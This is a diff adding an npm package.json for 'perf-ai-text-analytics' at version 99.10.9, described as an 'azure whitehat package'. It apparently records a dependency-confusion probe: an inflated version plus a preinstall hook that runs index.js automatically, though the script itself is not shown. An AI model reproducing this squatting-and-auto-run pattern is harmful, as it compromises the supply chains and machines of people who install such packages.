@@ -1,0 +1,39 @@
+{
+    "name": "perf-ai-text-analytics",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "perf-ai-text-analytics@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-JiBevUhZ2ykgWO55HzWhFDuVHcVYuwABK9EFW7BZ0JKyb5TDYzhrpk/+oVXNl17vCPvhVoTEUsO8zFsRBE6f7g==",
+        "shasum": "1edfddc739770437ea303b177d0a80a2b3908f27",
+        "tarball": "https://registry.npmjs.org/perf-ai-text-analytics/-/perf-ai-text-analytics-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3586,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhon0sCRA9TVsSAnZWagAAa2sP/3jFwpzoP5/NGJaiwGxR\nhMA/LU/KZ1U2OjrUh/7IclKoh+vflkA+59meFfG25ZsdMQQjUhvJ6efhj97x\nfOem1t1vgEizgr6pz5rTuxKHQyIDg33gxsR1ZfkLD6zU7GmFfr91Cglgwi4F\nAhtIvCFsJ2bdbR9U3xtajnaQnkF2EzsHFLR47dCW7Lmo0kmbp+ZLVTP+WZ4v\nfF9xvG/QsGpn8bn2NsxKDUV6uiYJgbWzUSnXI8sFu/lBUIg2QWffR0W7pd0x\nZuEJ4eiaHYZGke3GVBROHPdff26BYLDgqnPOoXJhUryEbddDnT0FEKCzEel8\n4g6f94nRp63Jl8yvMRlI1lwg6kw/4rWJeddFqpugpPMv+XF1ohAOFikEAn5U\np13JdoIup1DSm+J7jjCjbxrJ4Mep8PEMyA+obBHn4sw/TmqMjkA1495gWveh\nEEbw+SA8FFXhTl4rqq2awtnLmrvL91BZW7D1BIeUIL/o7QzJ+Fou6PgceuAz\nwHfA+dIWvcoHIXUokodMGYX5XiZzuI0LSbVW5hFo3wx6zXg04oZLxD80Y9T8\nI5r0HEyMD6pdwz+ukwVTbR0y+LAVQ6uouInwVWj5s1iRnPTzAoEXPMWr+mKX\n2U+LPO13lYfu/ndTg2+ew/uJZbnvNnA/w48xfhRRA9FfXsSIvy9yuUpXYiql\nd7wK\r\n=1oxT\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "rt11",
+        "email": "hussam.tes08@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "rt11",
+            "email": "hussam.tes08@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/perf-ai-text-analytics_99.10.9_1638038828041_0.9773458262695751"
+    },
+    "_hasShrinkwrap": false
+}
